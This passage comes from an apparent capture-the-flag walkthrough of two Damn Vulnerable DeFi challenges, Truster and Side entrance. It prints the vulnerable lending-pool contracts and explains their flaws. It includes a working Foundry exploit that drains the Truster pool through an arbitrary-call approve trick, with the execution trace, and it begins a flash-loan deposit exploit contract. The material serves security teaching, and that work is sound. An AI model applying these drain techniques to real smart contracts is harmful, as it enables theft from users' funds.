</span></span><span style="display:flex;"><span>        <span style="color:#434f54">damnValuableToken</span> <span style="color:#728e00">=</span> <span style="color:#434f54">IERC20</span>(<span style="color:#434f54">tokenAddress</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">flashLoan</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">borrowAmount</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">address</span> <span style="color:#434f54">borrower</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">address</span> <span style="color:#434f54">target</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">bytes</span> <span style="color:#434f54">calldata</span> <span style="color:#728e00">data</span>
</span></span><span style="display:flex;"><span>    ) <span style="color:#728e00">external</span> <span style="color:#434f54">nonReentrant</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">=</span> <span style="color:#434f54">damnValuableToken</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">borrowAmount</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">NotEnoughTokensInPool</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">damnValuableToken</span>.<span style="color:#728e00">transfer</span>(<span style="color:#434f54">borrower</span>, <span style="color:#434f54">borrowAmount</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">target</span>.<span style="color:#434f54">functionCall</span>(<span style="color:#728e00">data</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">balanceAfter</span> <span style="color:#728e00">=</span> <span style="color:#434f54">damnValuableToken</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">balanceAfter</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">balanceBefore</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">FlashLoanHasNotBeenPaidBack</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>The contract keeps a reference to the DVT ERC20 token, which is
set in the constructor:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">IERC20</span> <span style="color:#728e00">public</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">damnValuableToken</span>;
</span></span></code></pre></div><p>The <code>flashLoan</code> function takes 4 arguments:</p>
<ul>
<li><code>uint256 borrowAmount</code> &ndash; The amount of DVT tokens user wants
to borrow.</li>
<li><code>address borrower</code> &ndash; Same as in the previous
challenge, this function requires us to pass the borrower
address instead of just using <code>msg.sender</code>.</li>
<li><code>address target</code> &ndash; The flash loan receiver contract.</li>
<li><code>bytes calldata data</code> &ndash; The signature of an external function, which
is called on <code>target</code> contract 🤔.</li>
</ul>
<p>In the very beginning this function checks that the
contract has enough tokens to lend and transfers the requested
<code>borrowAmount</code> to the <code>borrower</code> address:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">=</span> <span style="color:#434f54">damnValuableToken</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
</span></span><span style="display:flex;"><span><span style="color:#728e00">if</span> (<span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">borrowAmount</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">NotEnoughTokensInPool</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">damnValuableToken</span>.<span style="color:#728e00">transfer</span>(<span style="color:#434f54">borrower</span>, <span style="color:#434f54">borrowAmount</span>);
</span></span></code></pre></div><p>And at the end it ensures that the borrower has repaid the
flash loan:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#434f54">balanceAfter</span> <span style="color:#728e00">=</span> <span style="color:#434f54">damnValuableToken</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
</span></span><span style="display:flex;"><span><span style="color:#728e00">if</span> (<span style="color:#434f54">balanceAfter</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">balanceBefore</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">FlashLoanHasNotBeenPaidBack</span>();
</span></span></code></pre></div><p>Everything looks good so far&hellip; until we encounter this line
right after transferring funds to the borrower:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">target</span>.<span style="color:#434f54">functionCall</span>(<span style="color:#728e00">data</span>);
</span></span></code></pre></div><p>The
<a href="https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCall-address-bytes-"  class="external-link" target="_blank" rel="noopener">functionCall</a>
is defined in the OpenZeppelin&rsquo;s <code>Address</code> library:</p>
 <div class="quote2">
<p>Performs a Solidity function call using a low level call. A
plain call is an unsafe replacement for a function call: use
this function instead. If target reverts with a revert reason,
it is bubbled up by this function (like regular Solidity
function calls).</p>
 </div>
<p>Basically this line above allows us to call any function on any
smart contract, which is a very bad news for the
<code>TrusterLenderPool</code> because we&rsquo;re going to use this flaw to
steal all the DVT&rsquo;s from it 😈.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Solution</p>
<p>There is no validation of the minimum allowed <code>borrowAmount</code>.
Hence we can borrow <code>0</code> tokens so we don&rsquo;t have to repay
anything at all. Then we can pass the encoded
<a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#IERC20-approve-address-uint256-"  class="external-link" target="_blank" rel="noopener">approve</a>
function to set the attacker an allowance to spend all the
<code>TrusterLenderPool</code>&rsquo;s tokens. Finally, the attacker can transfer
all the DVT tokens to its account.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">testExploit</span>() <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT START **/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">poolBalance</span> <span style="color:#728e00">=</span> <span style="color:#434f54">dvt</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">trusterLenderPool</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">prank</span>(<span style="color:#434f54">attacker</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bytes</span> <span style="color:#728e00">memory</span> <span style="color:#434f54">attrackCallData</span> <span style="color:#728e00">=</span> <span style="color:#728e00">abi</span>.<span style="color:#728e00">encodeWithSignature</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#7f8c8d">&#34;approve(address,uint256)&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">attacker</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">poolBalance</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">trusterLenderPool</span>.<span style="color:#434f54">flashLoan</span>(<span style="color:#8a7b52">0</span>, <span style="color:#434f54">attacker</span>, <span style="color:#00979d">address</span>(<span style="color:#434f54">dvt</span>), <span style="color:#434f54">attrackCallData</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">prank</span>(<span style="color:#434f54">attacker</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">dvt</span>.<span style="color:#434f54">transferFrom</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">trusterLenderPool</span>), <span style="color:#434f54">attacker</span>, <span style="color:#434f54">poolBalance</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT END **/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">validation</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We don&rsquo;t care about the <code>borrower</code> argument here, since we
aren&rsquo;t borrowing anything. So it could be any other address
instead, except the <code>address(0)</code>.</p>
<p>The trace:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#728e00">[</span>72299<span style="color:#728e00">]</span> Truster::testExploit<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  ├─ <span style="color:#728e00">[</span>2562<span style="color:#728e00">]</span> DVT::balanceOf<span style="color:#728e00">(</span>Truster Lender Pool: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#8a7b52">1000000000000000000000000</span>
</span></span><span style="display:flex;"><span>  ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::prank<span style="color:#728e00">(</span>Attacker: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  ├─ <span style="color:#728e00">[</span>36532<span style="color:#728e00">]</span> Truster Lender Pool::flashLoan<span style="color:#728e00">(</span>0, Attacker: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, DVT: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, ...<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>  │   ├─ <span style="color:#728e00">[</span>562<span style="color:#728e00">]</span> DVT::balanceOf<span style="color:#728e00">(</span>Truster Lender Pool: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>  │   │   └─ ← <span style="color:#8a7b52">1000000000000000000000000</span>
</span></span><span style="display:flex;"><span>  │   ├─ <span style="color:#728e00">[</span>5270<span style="color:#728e00">]</span> DVT::transfer<span style="color:#728e00">(</span>Attacker: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, 0<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>  │   │   ├─ emit Transfer<span style="color:#728e00">(</span>from: Truster Lender Pool: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, to: Attacker: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, value: 0<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>  │   │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>  │   ├─ <span style="color:#728e00">[</span>24624<span style="color:#728e00">]</span> DVT::approve<span style="color:#728e00">(</span>Attacker: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, 1000000000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>  │   │   ├─ emit Approval<span style="color:#728e00">(</span>owner: Truster Lender Pool: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, spender: Attacker: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, value: 1000000000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>  │   │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>  │   ├─ <span style="color:#728e00">[</span>562<span style="color:#728e00">]</span> DVT::balanceOf<span style="color:#728e00">(</span>Truster Lender Pool: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>  │   │   └─ ← <span style="color:#8a7b52">1000000000000000000000000</span>
</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::prank<span style="color:#728e00">(</span>Attacker: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  ├─ <span style="color:#728e00">[</span>22927<span style="color:#728e00">]</span> DVT::transferFrom<span style="color:#728e00">(</span>Truster Lender Pool: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, Attacker: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, 1000000000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>  │   ├─ emit Approval<span style="color:#728e00">(</span>owner: Truster Lender Pool: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, spender: Attacker: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, value: 0<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>  │   ├─ emit Transfer<span style="color:#728e00">(</span>from: Truster Lender Pool: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, to: Attacker: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, value: 1000000000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>  ├─ <span style="color:#728e00">[</span>562<span style="color:#728e00">]</span> DVT::balanceOf<span style="color:#728e00">(</span>Truster Lender Pool: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#8a7b52">0</span>
</span></span><span style="display:flex;"><span>  ├─ <span style="color:#728e00">[</span>562<span style="color:#728e00">]</span> DVT::balanceOf<span style="color:#728e00">(</span>Attacker: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#8a7b52">1000000000000000000000000</span>
</span></span><span style="display:flex;"><span>  └─ ← <span style="color:#728e00">()</span>
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Remediation</p>
<ul>
<li>Don&rsquo;t allow calling arbitrary functions, require a specific interface.</li>
<li>Use <code>msg.sender</code> instead of having the separate <code>borrower</code> and
<code>target</code> addresses.</li>
</ul>
<hr>
<p>I hope you enjoyed reading this post. The code for this
challenge is
<a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/test/Levels/naive-receiver/NaiveReceiver.t.sol#L49-L65"  class="external-link" target="_blank" rel="noopener">here</a>.
Let&rsquo;s continue to the next one &ndash;
<a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-4-side-entrance" >#4
Side entrance</a>.</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Damn Vulnerable DeFi, #4 Side entrance</p>
  <!--list-separator-->
<ul>
<li>
<p>Challenge</p>
 <div class="quote2">
<p>A surprisingly simple lending pool allows anyone to deposit ETH,
and withdraw it at any point in time. This very simple lending
pool has 1000 ETH in balance already, and is offering free flash
loans using the deposited ETH to promote their system. You must
take all ETH from the lending pool.</p>
 </div>
<p>Here is the lending pool contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">12</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">Address</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;openzeppelin-contracts/utils/Address.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">interface</span> <span style="color:#434f54">IFlashLoanEtherReceiver</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">execute</span>() <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">/**
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> * @title SideEntranceLenderPool
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">SideEntranceLenderPool</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">using</span> <span style="color:#434f54">Address</span> <span style="color:#728e00">for</span> <span style="color:#00979d">address</span> <span style="color:#728e00">payable</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">mapping</span>(<span style="color:#00979d">address</span> <span style="color:#728e00">=&gt;</span> <span style="color:#00979d">uint256</span>) <span style="color:#728e00">private</span> <span style="color:#434f54">balances</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">error</span> <span style="color:#434f54">NotEnoughETHInPool</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">error</span> <span style="color:#434f54">FlashLoanHasNotBeenPaidBack</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">deposit</span>() <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">+=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">withdraw</span>() <span style="color:#728e00">external</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">amountToWithdraw</span> <span style="color:#728e00">=</span> <span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">=</span> <span style="color:#8a7b52">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>).<span style="color:#434f54">sendValue</span>(<span style="color:#434f54">amountToWithdraw</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">flashLoan</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span>) <span style="color:#728e00">external</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">=</span> <span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>).<span style="color:#728e00">balance</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">amount</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">NotEnoughETHInPool</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">IFlashLoanEtherReceiver</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>).<span style="color:#434f54">execute</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#434f54">amount</span>}();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>).<span style="color:#728e00">balance</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">balanceBefore</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">revert</span> <span style="color:#434f54">FlashLoanHasNotBeenPaidBack</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Side entrance lender pool&hellip;🤔 Sounds like a &ldquo;lender pool with a
back door&rdquo; 😂</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>The first thing I&rsquo;ve noticed is that the <code>SideEntranceLenderPool</code>
doesn&rsquo;t use the <code>ReentrancyGuard</code>, in contrast to what we&rsquo;ve
seen in previous challenges. But at this moment it&rsquo;s not obvious
for me how to leverage the re-entrancy here.</p>
<p>The contract has the <code>balances</code> mapping to track the deposited ETH:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">mapping</span>(<span style="color:#00979d">address</span> <span style="color:#728e00">=&gt;</span> <span style="color:#00979d">uint256</span>) <span style="color:#728e00">private</span> <span style="color:#434f54">balances</span>;
</span></span></code></pre></div><p>Anyone can deposit funds using the <code>deposit</code> function:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">deposit</span>() <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">+=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>And they can withdraw their deposited funds by calling the
<code>withdraw</code> function:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">withdraw</span>() <span style="color:#728e00">external</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">amountToWithdraw</span> <span style="color:#728e00">=</span> <span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">=</span> <span style="color:#8a7b52">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>).<span style="color:#434f54">sendValue</span>(<span style="color:#434f54">amountToWithdraw</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It uses the
<a href="https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern"  class="external-link" target="_blank" rel="noopener">Checks-Effects-Interactions</a>
pattern, so it looks like it is invulnerable to the re-entrancy
attack.</p>
<p>Let&rsquo;s explore what the <code>flashLoan</code> function does:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">flashLoan</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span>) <span style="color:#728e00">external</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">=</span> <span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>).<span style="color:#728e00">balance</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">amount</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">NotEnoughETHInPool</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">IFlashLoanEtherReceiver</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>).<span style="color:#434f54">execute</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#434f54">amount</span>}();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>).<span style="color:#728e00">balance</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">balanceBefore</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">revert</span> <span style="color:#434f54">FlashLoanHasNotBeenPaidBack</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>It takes an <code>amount</code> of Ether that the user wants to borrow.</li>
<li>Check if the lending pool has enough funds.</li>
<li>Assumes that the <code>msg.sender</code> is a contract that implements
the <code>IFlashLoanEtherReceiver</code> interface and calls the
<code>execute</code> function on it sending the requested amount of
Ether.</li>
<li>Afterward, it checks that the flash loan has been repaid.</li>
</ul>
<p>The problem is that the lending pool contract doesn&rsquo;t check that
its balance is less than or equal to the sum of all the
deposited funds. What if we take a flash loan of all the
pool&rsquo;s funds and use the borrowed funds to make a deposit
repaying the loan simultaneously? That should let us take all
ETH and drain the pool.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Exploit</p>
<p>We need a contract that is going to take the loan. Let&rsquo;s call it
<code>Exploit</code>. It should implement the <code>IFlashLoanEtherReceiver</code>
interface and have the <code>receive</code> function so we could withdraw
our deposited funds later.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#728e00">contract</span> <span style="color:#434f54">Exploit</span> <span style="color:#728e00">is</span> <span style="color:#434f54">IFlashLoanEtherReceiver</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">SideEntranceLenderPool</span> <span style="color:#728e00">private</span> <span style="color:#434f54">pool</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">private</span> <span style="color:#434f54">owner</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#434f54">SideEntranceLenderPool</span> <span style="color:#434f54">_pool</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">pool</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_pool</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">execute</span>() <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span> <span style="color:#728e00">==</span> <span style="color:#00979d">address</span>(<span style="color:#434f54">pool</span>), <span style="color:#7f8c8d">&#34;Sender is not a pool&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// ...
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">run</span>() <span style="color:#728e00">external</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span> <span style="color:#728e00">==</span> <span style="color:#434f54">owner</span>, <span style="color:#7f8c8d">&#34;Not an owner&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">poolBalance</span> <span style="color:#728e00">=</span> <span style="color:#00979d">address</span>(<span style="color:#434f54">pool</span>).<span style="color:#728e00">balance</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">pool</span>.<span style="color:#434f54">flashLoan</span>(<span style="color:#434f54">poolBalance</span>);
</span></span><span style="display:flex;"><span>
